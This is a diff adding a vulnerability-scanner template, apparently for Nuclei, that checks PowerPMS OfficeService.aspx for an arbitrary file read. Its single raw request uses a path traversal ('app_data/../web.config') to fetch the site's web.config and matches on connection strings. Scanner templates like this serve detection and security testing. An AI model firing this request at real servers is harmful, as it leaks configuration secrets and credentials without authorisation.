@@ -1,0 +1,28 @@
+id: PowerPMS-OfficeService-ReadAnyFile
+
+info:
+  name: PowerPMS-OfficeService-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    PowerPMS-OfficeService-ReadAnyFile
+
+http:
+  - raw:
+      - |
+        POST /PowerPlat/FormXml/DocFile/OfficeService.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=download&WEBURL=app_data/../web.config
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "connectionStrings>"
+          - "configuration>"
+        condition: and
